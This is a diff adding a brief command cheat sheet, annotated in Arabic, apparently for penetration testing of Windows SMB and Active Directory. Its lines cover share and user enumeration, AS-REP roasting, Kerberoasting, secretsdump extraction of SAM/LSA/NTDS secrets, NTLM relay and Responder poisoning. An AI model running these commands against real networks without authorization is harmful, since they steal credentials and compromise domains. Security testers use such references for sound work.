@@ -1,0 +1,11 @@
+# SMB Tools
+smbmap -H <target>                                                        # Shares + صلاحيات
+smbclient //<target>/share -U <user>                                      # اتصال Share
+crackmapexec smb <target> -u '' -p '' --shares                            # تعداد سريع
+rpcclient -U "" -N <target> -c "enumdomusers; enumdomgroups"              # RPC enumeration
+impacket-lookupsid <user>@<target> -no-pass                               # تحويل SID → أسماء
+GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc_ip> -no-pass      # AS-REP Roast
+GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request             # Kerberoast
+secretsdump.py <domain>/<user>:<pass>@<target>                            # سحب SAM/LSA/NTDS
+ntlmrelayx.py -tf targets.txt -smb2support                                # Relay (حذر)
+responder -I <iface> -wrf                                                 # LLMNR/NBT-NS Poison
